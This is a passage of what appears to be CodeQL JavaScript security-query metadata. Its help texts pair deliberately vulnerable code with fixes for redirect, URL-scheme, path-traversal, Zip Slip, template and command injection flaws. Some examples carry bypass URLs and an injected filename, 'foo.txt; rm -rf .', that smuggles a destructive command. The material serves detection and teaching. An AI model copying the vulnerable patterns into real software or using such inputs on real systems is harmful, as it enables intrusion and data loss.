      kind: problem
      problem.severity: warning
      security-severity: 7.8
      precision: high
      id: js/incomplete-hostname-regexp
      tags: |-
        correctness
               security
               external/cwe/cwe-020
    queryHelp: |
      # Incomplete regular expression for hostnames
      Sanitizing untrusted URLs is an important technique for preventing attacks such as request forgeries and malicious redirections. Often, this is done by checking that the host of a URL is in a set of allowed hosts.

      If a regular expression implements such a check, it is easy to accidentally make the check too permissive by not escaping the `.` meta-characters appropriately. Even if the check is not used in a security-critical context, the incomplete check may still cause undesirable behaviors when it accidentally succeeds.


      ## Recommendation
      Escape all meta-characters appropriately when constructing regular expressions for security checks, and pay special attention to the `.` meta-character.


      ## Example
      The following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains.


      ```javascript
      app.get('/some/path', function(req, res) {
          let url = req.param('url'),
              host = urlLib.parse(url).host;
          // BAD: the host of `url` may be controlled by an attacker
          let regex = /^((www|beta).)?example.com/;
          if (host.match(regex)) {
              res.redirect(url);
          }
      });

      ```
      The check is however easy to bypass because the unescaped `.` allows for any character before `example.com`, effectively allowing the redirect to go to an attacker-controlled domain such as `wwwXexample.com`.

      Address this vulnerability by escaping `.` appropriately: `let regex = /^((www|beta)\.)?example\.com/`.


      ## References
      * MDN: [Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions)
      * OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)
      * OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).
      * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-020/IncompleteUrlSchemeCheck.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/IncompleteUrlSchemeCheck.bqrs
    metadata:
      name: Incomplete URL scheme check
      description: |-
        Checking for the "javascript:" URL scheme without also checking for "vbscript:"
                      and "data:" suggests a logic error or even a security vulnerability.
      kind: problem
      problem.severity: warning
      security-severity: 7.8
      precision: high
      id: js/incomplete-url-scheme-check
      tags: |-
        security
               correctness
               external/cwe/cwe-020
               external/cwe/cwe-184
    queryHelp: |
      # Incomplete URL scheme check
      URLs starting with `javascript:` can be used to encode JavaScript code to be executed when the URL is visited. While this is a powerful mechanism for creating feature-rich and responsive web applications, it is also a potential security risk: if the URL comes from an untrusted source, it might contain harmful JavaScript code. For this reason, many frameworks and libraries first check the URL scheme of any untrusted URL, and reject URLs with the `javascript:` scheme.

      However, the `data:` and `vbscript:` schemes can be used to represent executable code in a very similar way, so any validation logic that checks against `javascript:`, but not against `data:` and `vbscript:`, is likely to be insufficient.


      ## Recommendation
      Add checks covering both `data:` and `vbscript:`.


      ## Example
      The following function validates a (presumably untrusted) URL `url`. If it starts with `javascript:` (case-insensitive and potentially preceded by whitespace), the harmless placeholder URL `about:blank` is returned to prevent code injection; otherwise `url` itself is returned.


      ```javascript
      function sanitizeUrl(url) {
          let u = decodeURI(url).trim().toLowerCase();
          if (u.startsWith("javascript:"))
              return "about:blank";
          return url;
      }

      ```
      While this check provides partial projection, it should be extended to cover `data:` and `vbscript:` as well:


      ```javascript
      function sanitizeUrl(url) {
          let u = decodeURI(url).trim().toLowerCase();
          if (u.startsWith("javascript:") || u.startsWith("data:") || u.startsWith("vbscript:"))
              return "about:blank";
          return url;
      }

      ```

      ## References
      * WHATWG: [URL schemes](https://wiki.whatwg.org/wiki/URL_schemes).
      * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
      * Common Weakness Enumeration: [CWE-184](https://cwe.mitre.org/data/definitions/184.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-020/IncompleteUrlSubstringSanitization.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/IncompleteUrlSubstringSanitization.bqrs
    metadata:
      name: Incomplete URL substring sanitization
      description:
        Security checks on the substrings of an unparsed URL are often vulnerable
        to bypassing.
      kind: problem
      problem.severity: warning
      security-severity: 7.8
      precision: high
      id: js/incomplete-url-substring-sanitization
      tags: |-
        correctness
               security
               external/cwe/cwe-020
    queryHelp: |
      # Incomplete URL substring sanitization
      Sanitizing untrusted URLs is an important technique for preventing attacks such as request forgeries and malicious redirections. Usually, this is done by checking that the host of a URL is in a set of allowed hosts.

      However, treating the URL as a string and checking if one of the allowed hosts is a substring of the URL is very prone to errors. Malicious URLs can bypass such security checks by embedding one of the allowed hosts in an unexpected location.

      Even if the substring check is not used in a security-critical context, the incomplete check may still cause undesirable behaviors when the check succeeds accidentally.


      ## Recommendation
      Parse a URL before performing a check on its host value, and ensure that the check handles arbitrary subdomain sequences correctly.


      ## Example
      The following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains, and not some malicious site.


      ```javascript
      app.get('/some/path', function(req, res) {
          let url = req.param("url");
          // BAD: the host of `url` may be controlled by an attacker
          if (url.includes("example.com")) {
              res.redirect(url);
          }
      });

      ```
      The substring check is, however, easy to bypass. For example by embedding `example.com` in the path component: `http://evil-example.net/example.com`, or in the query string component: `http://evil-example.net/?x=example.com`. Address these shortcomings by checking the host of the parsed URL instead:


      ```javascript
      app.get('/some/path', function(req, res) {
          let url = req.param("url"),
              host = urlLib.parse(url).host;
          // BAD: the host of `url` may be controlled by an attacker
          if (host.includes("example.com")) {
              res.redirect(url);
          }
      });

      ```
      This is still not a sufficient check as the following URLs bypass it: `http://evil-example.com` `http://example.com.evil-example.net`. Instead, use an explicit whitelist of allowed hosts to make the redirect secure:


      ```javascript
      app.get('/some/path', function(req, res) {
          let url = req.param('url'),
              host = urlLib.parse(url).host;
          // GOOD: the host of `url` can not be controlled by an attacker
          let allowedHosts = [
              'example.com',
              'beta.example.com',
              'www.example.com'
          ];
          if (allowedHosts.includes(host)) {
              res.redirect(url);
          }
      });

      ```

      ## References
      * OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)
      * OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).
      * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-020/IncorrectSuffixCheck.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/IncorrectSuffixCheck.bqrs
    metadata:
      name: Incorrect suffix check
      description:
        Using indexOf to implement endsWith functionality is error-prone
        if the -1 case is not explicitly handled.
      kind: problem
      problem.severity: error
      security-severity: 7.8
      precision: high
      id: js/incorrect-suffix-check
      tags: |-
        security
               correctness
               external/cwe/cwe-020
    queryHelp: |
      # Incorrect suffix check
      The `indexOf` and `lastIndexOf` methods are sometimes used to check if a substring occurs at a certain position in a string. However, if the returned index is compared to an expression that might evaluate to -1, the check may pass in some cases where the substring was not found at all.

      Specifically, this can easily happen when implementing `endsWith` using `indexOf`.


      ## Recommendation
      Use `String.prototype.endsWith` if it is available. Otherwise, explicitly handle the -1 case, either by checking the relative lengths of the strings, or by checking if the returned index is -1.


      ## Example
      The following example uses `lastIndexOf` to determine if the string `x` ends with the string `y`:


      ```javascript
      function endsWith(x, y) {
        return x.lastIndexOf(y) === x.length - y.length;
      }

      ```
      However, if `y` is one character longer than `x`, the right-hand side `x.length - y.length` becomes -1, which then equals the return value of `lastIndexOf`. This will make the test pass, even though `x` does not end with `y`.

      To avoid this, explicitly check for the -1 case:


      ```javascript
      function endsWith(x, y) {
        let index = x.lastIndexOf(y);
        return index !== -1 && index === x.length - y.length;
      }

      ```

      ## References
      * MDN: [String.prototype.endsWith](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/endsWith)
      * MDN: [String.prototype.indexOf](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/indexOf)
      * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-020/MissingOriginCheck.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/MissingOriginCheck.bqrs
    metadata:
      name: Missing origin verification in `postMessage` handler
      description:
        Missing origin verification in a `postMessage` handler allows any
        windows to send arbitrary data to the handler.
      kind: problem
      problem.severity: warning
      security-severity: 5
      precision: medium
      id: js/missing-origin-check
      tags: |-
        correctness
               security
               external/cwe/cwe-020
               external/cwe/cwe-940
    queryHelp: |
      # Missing origin verification in `postMessage` handler
      The `"message"` event is used to send messages between windows. An untrusted window can send a message to a trusted window, and it is up to the receiver to verify the legitimacy of the message. One way of performing that verification is to check the `origin` of the message ensure that it originates from a trusted window.


      ## Recommendation
      Always verify the origin of incoming messages.


      ## Example
      The example below uses a received message to execute some code. However, the origin of the message is not checked, so it might be possible for an attacker to execute arbitrary code.


      ```javascript
      function postMessageHandler(event) {
          let origin = event.origin.toLowerCase();

          console.log(origin)
          // BAD: the origin property is not checked
          eval(event.data);
      }

      window.addEventListener('message', postMessageHandler, false);

      ```
      The example is fixed below, where the origin is checked to be trusted. It is therefore not possible for a malicious user to perform an attack using an untrusted origin.


      ```javascript
      function postMessageHandler(event) {
          console.log(event.origin)
          // GOOD: the origin property is checked
          if (event.origin === 'https://www.example.com') {
              // do something
          }
      }

      window.addEventListener('message', postMessageHandler, false);
      ```

      ## References
      * [Window.postMessage()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage).
      * [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation).
      * [The pitfalls of postMessage](https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/).
      * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
      * Common Weakness Enumeration: [CWE-940](https://cwe.mitre.org/data/definitions/940.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-020/MissingRegExpAnchor.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/MissingRegExpAnchor.bqrs
    metadata:
      name: Missing regular expression anchor
      description: Regular expressions without anchors can be vulnerable to bypassing.
      kind: problem
      problem.severity: warning
      security-severity: 7.8
      precision: medium
      id: js/regex/missing-regexp-anchor
      tags: |-
        correctness
               security
               external/cwe/cwe-020
    queryHelp: |
      # Missing regular expression anchor
      Sanitizing untrusted input with regular expressions is a common technique. However, it is error-prone to match untrusted input against regular expressions without anchors such as `^` or `$`. Malicious input can bypass such security checks by embedding one of the allowed patterns in an unexpected location.

      Even if the matching is not done in a security-critical context, it may still cause undesirable behavior when the regular expression accidentally matches.


      ## Recommendation
      Use anchors to ensure that regular expressions match at the expected locations.


      ## Example
      The following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains, and not some malicious site.


      ```javascript
      app.get("/some/path", function(req, res) {
          let url = req.param("url");
          // BAD: the host of `url` may be controlled by an attacker
          if (url.match(/https?:\/\/www\.example\.com\//)) {
              res.redirect(url);
          }
      });

      ```
      The check with the regular expression match is, however, easy to bypass. For example by embedding `http://example.com/` in the query string component: `http://evil-example.net/?x=http://example.com/`. Address these shortcomings by using anchors in the regular expression instead:


      ```javascript
      app.get("/some/path", function(req, res) {
          let url = req.param("url");
          // GOOD: the host of `url` can not be controlled by an attacker
          if (url.match(/^https?:\/\/www\.example\.com\//)) {
              res.redirect(url);
          }
      });

      ```
      A related mistake is to write a regular expression with multiple alternatives, but to only include an anchor for one of the alternatives. As an example, the regular expression `/^www\.example\.com|beta\.example\.com/` will match the host `evil.beta.example.com` because the regular expression is parsed as `/(^www\.example\.com)|(beta\.example\.com)/`


      ## References
      * MDN: [Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions)
      * OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)
      * OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).
      * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-020/OverlyLargeRange.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/OverlyLargeRange.bqrs
    metadata:
      name: Overly permissive regular expression range
      description: |-
        Overly permissive regular expression ranges match a wider range of characters than intended.
                      This may allow an attacker to bypass a filter or sanitizer.
      kind: problem
      problem.severity: warning
      security-severity: 5.0
      precision: high
      id: js/overly-large-range
      tags: |-
        correctness
               security
               external/cwe/cwe-020
    queryHelp: |
      # Overly permissive regular expression range
      It's easy to write a regular expression range that matches a wider range of characters than you intended. For example, `/[a-zA-z]/` matches all lowercase and all uppercase letters, as you would expect, but it also matches the characters: `` [ \ ] ^ _ ` ``.

      Another common problem is failing to escape the dash character in a regular expression. An unescaped dash is interpreted as part of a range. For example, in the character class `[a-zA-Z0-9%=.,-_]` the last character range matches the 55 characters between `,` and `_` (both included), which overlaps with the range `[0-9]` and is clearly not intended by the writer.


      ## Recommendation
      Avoid any confusion about which characters are included in the range by writing unambiguous regular expressions. Always check that character ranges match only the expected characters.


      ## Example
      The following example code is intended to check whether a string is a valid 6 digit hex color.

      ```javascript

      function isValidHexColor(color) {
          return /^#[0-9a-fA-f]{6}$/i.test(color);
      }

      ```
      However, the `A-f` range is overly large and matches every uppercase character. It would parse a "color" like `#XXYYZZ` as valid.

      The fix is to use an uppercase `A-F` range instead.

      ```javascript

      function isValidHexColor(color) {
          return /^#[0-9A-F]{6}$/i.test(color);
      }

      ```

      ## References
      * GitHub Advisory Database: [CVE-2021-42740: Improper Neutralization of Special Elements used in a Command in Shell-quote](https://github.com/advisories/GHSA-g4rg-993r-mgx7)
      * wh0.github.io: [Exploiting CVE-2021-42740](https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html)
      * Yosuke Ota: [no-obscure-range](https://ota-meshi.github.io/eslint-plugin-regexp/rules/no-obscure-range.html)
      * Paul Boyd: [The regex \[,-.\]](https://pboyd.io/posts/comma-dash-dot/)
      * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-020/UntrustedDataToExternalAPI.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/UntrustedDataToExternalAPI.bqrs
    metadata:
      name: Untrusted data passed to external API
      description:
        "Data provided remotely is used in this external API without sanitization,\
        \ which could be a security risk."
      id: js/untrusted-data-to-external-api
      kind: path-problem
      precision: low
      problem.severity: error
      security-severity: 7.8
      tags: security external/cwe/cwe-020
    queryHelp: |
      # Untrusted data passed to external API
      Using unsanitized untrusted data in an external API can cause a variety of security issues. This query reports external APIs that use untrusted data. The results are not filtered so that you can audit all examples. The query provides data for security reviews of the application and you can also use it to identify external APIs that should be modeled as either taint steps, or sinks for specific problems.

      An external API is defined as a method call to a method that is not defined in the source code, not overridden in the source code, and is not modeled as a taint step in the default taint library. External APIs may be from the third-party dependencies or from internal dependencies. The query reports uses of untrusted data one of the arguments of external API call or in the return value from a callback passed to an external API.


      ## Recommendation
      For each result:

      * If the result highlights a known sink, confirm that the result is reported by the relevant query, or that the result is a false positive because this data is sanitized.
      * If the result highlights an unknown sink for a problem, then add modeling for the sink to the relevant query, and confirm that the result is either found, or is safe due to appropriate sanitization.
      * If the result represents a call to an external API that transfers taint, add the appropriate modeling, and re-run the query to determine what new results have appeared due to this additional modeling.
      Otherwise, the result is likely uninteresting. Custom versions of this query can extend the `SafeExternalAPIMethod` class to exclude known safe external APIs from future analysis.


      ## Example
      In this first example, a query parameter is read from the `req` parameter and then ultimately used in a call to the `res.send` external API:


      ```javascript
      express().get('/news', (req, res) => {
          let topic = req.query.topic;
          res.send(`<h1>${topic}</h1>`);
      });

      ```
      This is a reflected XSS sink. The XSS query should therefore be reviewed to confirm that this sink is appropriately modeled, and if it is, to confirm that the query reports this particular result, or that the result is a false positive due to some existing sanitization.

      In this second example, again a query parameter is read from `req`.


      ```javascript
      let path = require('path');

      express().get('/data', (req, res) => {
          let file = path.join(HOME_DIR, 'public', req.query.file);
          res.sendFile(file);
      });

      ```
      If the query reported the call to `path.join` on line 4, this would suggest that this external API is not currently modeled as a taint step in the taint tracking library. The next step would be to model this as a taint step, then re-run the query to determine what additional results might be found. In this example, it seems the result of the `path.join` will be used as a file path, leading to a path traversal vulnerability.

      Note that both examples are correctly handled by the standard taint tracking library and security queries.


      ## References
      * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-020/UselessRegExpCharacterEscape.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-020/UselessRegExpCharacterEscape.bqrs
    metadata:
      name: Useless regular-expression character escape
      description: |-
        Prepending a backslash to an ordinary character in a string
                      does not have any effect, and may make regular expressions constructed from this string
                      behave unexpectedly.
      kind: problem
      problem.severity: error
      security-severity: 7.8
      precision: high
      id: js/useless-regexp-character-escape
      tags: |-
        correctness
               security
               external/cwe/cwe-020
    queryHelp: |
      # Useless regular-expression character escape
      When a character in a string literal or regular expression literal is preceded by a backslash, it is interpreted as part of an escape sequence. For example, the escape sequence `\n` in a string literal corresponds to a single `newline` character, and not the `\` and `n` characters. However, not all characters change meaning when used in an escape sequence. In this case, the backslash just makes the character appear to mean something else, and the backslash actually has no effect. For example, the escape sequence `\k` in a string literal just means `k`. Such superfluous escape sequences are usually benign, and do not change the behavior of the program.

      The set of characters that change meaning when in escape sequences is different for regular expression literals and string literals. This can be problematic when a regular expression literal is turned into a regular expression that is built from one or more string literals. The problem occurs when a regular expression escape sequence loses its special meaning in a string literal.


      ## Recommendation
      Ensure that the right amount of backslashes is used when escaping characters in strings, template literals and regular expressions. Pay special attention to the number of backslashes when rewriting a regular expression as a string literal.


      ## Example
      The following example code checks that a string is `"my-marker"`, possibly surrounded by white space:


      ```javascript
      let regex = new RegExp('(^\s*)my-marker(\s*$)'),
          isMyMarkerText = regex.test(text);

      ```
      However, the check does not work properly for white space as the two `\s` occurrences are semantically equivalent to just `s`, meaning that the check will succeed for strings like `"smy-markers"` instead of `" my-marker "`. Address these shortcomings by either using a regular expression literal (`/(^\s*)my-marker(\s*$)/`), or by adding extra backslashes (`'(^\\s*)my-marker(\\s*$)'`).


      ## References
      * MDN: [Regular expression escape notation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions#Escaping)
      * MDN: [String escape notation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String#Escape_notation)
      * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-022/TaintedPath.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-022/TaintedPath.bqrs
    metadata:
      name: Uncontrolled data used in path expression
      description: |-
        Accessing paths influenced by users can allow an attacker to access
                      unexpected resources.
      kind: path-problem
      problem.severity: error
      security-severity: 7.5
      precision: high
      id: js/path-injection
      tags: |-
        security
               external/cwe/cwe-022
               external/cwe/cwe-023
               external/cwe/cwe-036
               external/cwe/cwe-073
               external/cwe/cwe-099
    queryHelp: |
      # Uncontrolled data used in path expression
      Accessing files using paths constructed from user-controlled data can allow an attacker to access unexpected resources. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.


      ## Recommendation
      Validate user input before using it to construct a file path.

      The validation method you should use depends on whether you want to allow the user to specify complex paths with multiple components that may span multiple folders, or only simple filenames without a path component.

      In the former case, a common strategy is to make sure that the constructed file path is contained within a safe root folder. First, normalize the path using `path.resolve` or `fs.realpathSync` to remove any ".." segments. You should always normalize the file path since an unnormalized path that starts with the root folder can still be used to access files outside the root folder. Then, after you have normalized the path, check that the path starts with the root folder.

      In the latter case, you can use a library like the `sanitize-filename` npm package to eliminate any special characters from the file path. Note that it is *not* sufficient to only remove "../" sequences: for example, applying this filter to ".../...//" would still result in the string "../".

      Finally, the simplest (but most restrictive) option is to use an allow list of safe patterns and make sure that the user input matches one of these patterns.


      ## Example
      In the first (bad) example, the code reads the file name from an HTTP request, then accesses that file within a root folder. A malicious user could enter a file name containing "../" segments to navigate outside the root folder and access sensitive files.


      ```javascript
      const fs = require('fs'),
            http = require('http'),
            url = require('url');

      const ROOT = "/var/www/";

      var server = http.createServer(function(req, res) {
        let filePath = url.parse(req.url, true).query.path;

        // BAD: This function uses unsanitized input that can read any file on the file system.
        res.write(fs.readFileSync(ROOT + filePath, 'utf8'));
      });
      ```
      The second (good) example shows how to avoid access to sensitive files by sanitizing the file path. First, the code resolves the file name relative to a root folder, normalizing the path and removing any "../" segments in the process. Then, the code calls `fs.realpathSync` to resolve any symbolic links in the path. Finally, the code checks that the normalized path starts with the path of the root folder, ensuring the file is contained within the root folder.


      ```javascript
      const fs = require('fs'),
            http = require('http'),
            path = require('path'),
            url = require('url');

      const ROOT = "/var/www/";

      var server = http.createServer(function(req, res) {
        let filePath = url.parse(req.url, true).query.path;

        // GOOD: Verify that the file path is under the root directory
        filePath = fs.realpathSync(path.resolve(ROOT, filePath));
        if (!filePath.startsWith(ROOT)) {
          res.statusCode = 403;
          res.end();
          return;
        }
        res.write(fs.readFileSync(filePath, 'utf8'));
      });
      ```

      ## References
      * OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).
      * npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.
      * Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).
      * Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).
      * Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).
      * Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).
      * Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-022/ZipSlip.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-022/ZipSlip.bqrs
    metadata:
      name: Arbitrary file access during archive extraction ("Zip Slip")
      description: |-
        Extracting files from a malicious ZIP file, or similar type of archive, without
                      validating that the destination file path is within the destination directory
                      can allow an attacker to unexpectedly gain access to resources.
      kind: path-problem
      id: js/zipslip
      problem.severity: error
      security-severity: 7.5
      precision: high
      tags: |-
        security
               external/cwe/cwe-022
    queryHelp: |
      # Arbitrary file access during archive extraction ("Zip Slip")
      Extracting files from a malicious zip file, or similar type of archive, is at risk of directory traversal attacks if filenames from the archive are not properly validated. archive paths.

      Zip archives contain archive entries representing each file in the archive. These entries include a file path for the entry, but these file paths are not restricted and may contain unexpected special elements such as the directory traversal element (`..`). If these file paths are used to create a filesystem path, then a file operation may happen in an unexpected location. This can result in sensitive information being revealed or deleted, or an attacker being able to influence behavior by modifying unexpected files.

      For example, if a zip file contains a file entry `..\sneaky-file`, and the zip file is extracted to the directory `c:\output`, then naively combining the paths would result in an output file path of `c:\output\..\sneaky-file`, which would cause the file to be written to `c:\sneaky-file`.


      ## Recommendation
      Ensure that output paths constructed from zip archive entries are validated to prevent writing files to unexpected locations.

      The recommended way of writing an output file from a zip archive entry is to check that `".."` does not occur in the path.


      ## Example
      In this example an archive is extracted without validating file paths. If `archive.zip` contained relative paths (for instance, if it were created by something like `zip archive.zip ../file.txt`) then executing this code could write to locations outside the destination directory.


      ```javascript
      const fs = require('fs');
      const unzip = require('unzip');

      fs.createReadStream('archive.zip')
        .pipe(unzip.Parse())
        .on('entry', entry => {
          const fileName = entry.path;
          // BAD: This could write any file on the filesystem.
          entry.pipe(fs.createWriteStream(fileName));
        });

      ```
      To fix this vulnerability, we need to check that the path does not contain any `".."` elements in it.


      ```javascript
      const fs = require('fs');
      const unzip = require('unzip');

      fs.createReadStream('archive.zip')
        .pipe(unzip.Parse())
        .on('entry', entry => {
          const fileName = entry.path;
          // GOOD: ensures the path is safe to write to.
          if (fileName.indexOf('..') == -1) {
            entry.pipe(fs.createWriteStream(fileName));
          }
          else {
            console.log('skipping bad path', fileName);
          }
        });

      ```

      ## References
      * Snyk: [Zip Slip Vulnerability](https://snyk.io/research/zip-slip-vulnerability).
      * OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).
      * Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-073/TemplateObjectInjection.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-073/TemplateObjectInjection.bqrs
    metadata:
      name: Template Object Injection
      description:
        Instantiating a template using a user-controlled object is vulnerable
        to local file read and potential remote code execution.
      kind: path-problem
      problem.severity: error
      security-severity: 9.3
      precision: high
      id: js/template-object-injection
      tags: |-
        security
               external/cwe/cwe-073
               external/cwe/cwe-094
    queryHelp: |
      # Template Object Injection
      Directly using user-controlled objects as arguments to template engines might allow an attacker to do local file reads or even remote code execution.


      ## Recommendation
      Avoid using user-controlled objects as arguments to a template engine. Instead, construct the object explicitly with the specific properties needed by the template.


      ## Example
      In the example below a server uses the user-controlled `profile` object to render the `index` template.


      ```javascript
      var app = require('express')();
      app.set('view engine', 'hbs');

      app.post('/', function (req, res, next) {
          var profile = req.body.profile;
          res.render('index', profile);
      });
      ```
      However, if an attacker adds a `layout` property to the `profile` object then the server will load the file specified by the `layout` property, thereby allowing an attacker to do local file reads.

      The fix is to have the server construct the object, and only add the properties that are needed by the template.


      ```javascript
      var app = require('express')();
      app.set('view engine', 'hbs');

      app.post('/', function (req, res, next) {
          var profile = req.body.profile;
          res.render('index', {
              name: profile.name,
              location: profile.location
          });
      });
      ```

      ## References
      * blog.shoebpatel.com: [The Secret Parameter, LFR, and Potential RCE in NodeJS Apps](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/).
      * cwe.mitre.org: [CWE-73: External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)
      * Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).
      * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-078/CommandInjection.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-078/CommandInjection.bqrs
    metadata:
      name: Uncontrolled command line
      description: |-
        Using externally controlled strings in a command line may allow a malicious
                      user to change the meaning of the command.
      kind: path-problem
      problem.severity: error
      security-severity: 9.8
      precision: high
      id: js/command-line-injection
      tags: |-
        correctness
               security
               external/cwe/cwe-078
               external/cwe/cwe-088
    queryHelp: |
      # Uncontrolled command line
      Code that passes untrusted user input directly to `child_process.exec` or similar APIs that execute shell commands allows the user to execute malicious code.


      ## Recommendation
      If possible, use APIs that don't run shell commands and that accept command arguments as an array of strings rather than a single concatenated string. This is both safer and more portable.

      If given arguments as a single string, avoid simply splitting the string on whitespace. Arguments may contain quoted whitespace, causing them to split into multiple arguments. Use a library like `shell-quote` to parse the string into an array of arguments instead.

      If this approach is not viable, then add code to verify that the user input string is safe before using it.


      ## Example
      The following example shows code that extracts a filename from an HTTP query parameter that may contain untrusted data, and then embeds it into a shell command to count its lines without examining it first:


      ```javascript
      var cp = require("child_process"),
          http = require('http'),
          url = require('url');

      var server = http.createServer(function(req, res) {
          let file = url.parse(req.url, true).query.path;

          cp.execSync(`wc -l ${file}`); // BAD
      });

      ```
      A malicious user can take advantage of this code by executing arbitrary shell commands. For example, by providing a filename like `foo.txt; rm -rf .`, the user can first count the lines in `foo.txt` and subsequently delete all files in the current directory.

      To avoid this catastrophic behavior, use an API such as `child_process.execFileSync` that does not spawn a shell by default:


      ```javascript
      var cp = require("child_process"),
          http = require('http'),
          url = require('url');

      var server = http.createServer(function(req, res) {
          let file = url.parse(req.url, true).query.path;

          cp.execFileSync('wc', ['-l', file]); // GOOD
      });

      ```
      If you want to allow the user to specify other options to `wc`, you can use a library like `shell-quote` to parse the user input into an array of arguments without risking command injection:


      ```javascript
      var cp = require("child_process"),
          http = require('http'),
          url = require('url'),
          shellQuote = require('shell-quote');

      var server = http.createServer(function(req, res) {
          let options = url.parse(req.url, true).query.options;

          cp.execFileSync('wc', shellQuote.parse(options)); // GOOD
      });

      ```
      Alternatively, the original example can be made safe by checking the filename against an allowlist of safe characters before using it:


      ```javascript
      var cp = require("child_process"),
          http = require('http'),
          url = require('url');

      var server = http.createServer(function(req, res) {
          let file = url.parse(req.url, true).query.path;

          // only allow safe characters in file name
          if (file.match(/^[\w\.\-\/]+$/)) {
              cp.execSync(`wc -l ${file}`); // GOOD
          }
      });

      ```

      ## References
      * OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).
      * npm: [shell-quote](https://www.npmjs.com/package/shell-quote).
      * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
      * Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).
  - pack: codeql/javascript-queries#0
    relativeQueryPath: Security/CWE-078/IndirectCommandInjection.ql
    relativeBqrsPath: codeql/javascript-queries/Security/CWE-078/IndirectCommandInjection.bqrs
    metadata:
      name: Indirect uncontrolled command line
      description: |-
        Forwarding command-line arguments to a child process
                      executed within a shell may indirectly introduce
                      command-line injection vulnerabilities.
      kind: path-problem
      problem.severity: warning
      security-severity: 6.3
      precision: medium
      id: js/indirect-command-line-injection
      tags: |-
        correctness
               security
               external/cwe/cwe-078
               external/cwe/cwe-088
    queryHelp: |
      # Indirect uncontrolled command line
